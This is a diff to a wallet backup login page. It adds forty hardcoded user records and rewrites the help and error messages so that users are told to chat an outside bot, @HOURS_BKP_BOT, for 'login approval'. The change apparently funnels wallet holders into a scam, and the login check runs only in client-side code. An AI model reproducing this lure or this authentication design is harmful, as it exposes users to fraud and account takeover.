@@ -117,8 +117,8 @@
         <h3>Important Backup Information</h3>
         <p>1. This page is for users who have a backup.</p>
         <p>2. Please make sure you have your backup information ready.</p>
-        <p>3. Contact support if you face any issues.</p>
-        <p>4. Make sure to store your backup safely and securely.</p>
+        <p>3. Contact support bot for login approval.</p>
+        <p>4. Make sure to store your backup safely.</p>
     </div>
     
     <!-- User Input Form -->
@@ -143,6 +143,46 @@
             { username: "@amk8", walletAddress: "xxx8", balance: 1008 },
             { username: "@amk9", walletAddress: "xxx9", balance: 1009 },
             { username: "@amk10", walletAddress: "xxx10", balance: 1010 },
+            { username: "@amk11", walletAddress: "xxx11", balance: 1001 },
+            { username: "@amk12", walletAddress: "xxx12", balance: 1002 },
+            { username: "@amk13", walletAddress: "xxx13", balance: 1003 },
+            { username: "@amk14", walletAddress: "xxx14", balance: 1004 },
+            { username: "@amk15", walletAddress: "xxx15", balance: 1005 },
+            { username: "@amk16", walletAddress: "xxx16", balance: 1006 },
+            { username: "@amk17", walletAddress: "xxx17", balance: 1007 },
+            { username: "@amk18", walletAddress: "xxx18", balance: 1008 },
+            { username: "@amk19", walletAddress: "xxx19", balance: 1009 },
+            { username: "@amk20", walletAddress: "xxx20", balance: 1010 },
+            { username: "@amk21", walletAddress: "xxx21", balance: 1001 },
+            { username: "@amk22", walletAddress: "xxx22", balance: 1002 },
+            { username: "@amk23", walletAddress: "xxx23", balance: 1003 },
+            { username: "@amk24", walletAddress: "xxx24", balance: 1004 },
+            { username: "@amk25", walletAddress: "xxx25", balance: 1005 },
+            { username: "@amk26", walletAddress: "xxx26", balance: 1006 },
+            { username: "@amk27", walletAddress: "xxx27", balance: 1007 },
+            { username: "@amk28", walletAddress: "xxx28", balance: 1008 },
+            { username: "@amk29", walletAddress: "xxx29", balance: 1009 },
+            { username: "@amk30", walletAddress: "xxx30", balance: 1010 },
+            { username: "@amk31", walletAddress: "xxx31", balance: 1001 },
+            { username: "@amk32", walletAddress: "xxx32", balance: 1002 },
+            { username: "@amk33", walletAddress: "xxx33", balance: 1003 },
+            { username: "@amk34", walletAddress: "xxx34", balance: 1004 },
+            { username: "@amk35", walletAddress: "xxx35", balance: 1005 },
+            { username: "@amk36", walletAddress: "xxx36", balance: 1006 },
+            { username: "@amk37", walletAddress: "xxx37", balance: 1007 },
+            { username: "@amk38", walletAddress: "xxx38", balance: 1008 },
+            { username: "@amk39", walletAddress: "xxx39", balance: 1009 },
+            { username: "@amk40", walletAddress: "xxx40", balance: 1010 },
+            { username: "@amk41", walletAddress: "xxx41", balance: 1001 },
+            { username: "@amk42", walletAddress: "xxx42", balance: 1002 },
+            { username: "@amk43", walletAddress: "xxx43", balance: 1003 },
+            { username: "@amk44", walletAddress: "xxx44", balance: 1004 },
+            { username: "@amk45", walletAddress: "xxx45", balance: 1005 },
+            { username: "@amk46", walletAddress: "xxx46", balance: 1006 },
+            { username: "@amk47", walletAddress: "xxx47", balance: 1007 },
+            { username: "@amk48", walletAddress: "xxx48", balance: 1008 },
+            { username: "@amk49", walletAddress: "xxx49", balance: 1009 },
+            { username: "@amk50", walletAddress: "xxx50", balance: 1010 },
         ];
 
         function login() {
@@ -159,13 +199,13 @@
                 localStorage.setItem('balance', user.balance);
 
                 // Show success message
-                showMessage(`Login successful! Welcome ${user.username}. Your balance is ${user.balance}.`);
+                showMessage(`Login successful!`);
                 
                 // Redirect to index.html
                 window.location.href = 'index.html';
             } else {
                 // Show error message if no match is found
-                showMessage("Invalid username or wallet address. Please check your credentials.");
+                showMessage("Ohhh!,You forgot to request for login approval Please chat @HOURS_BKP_BOT.");
             }
         }
 
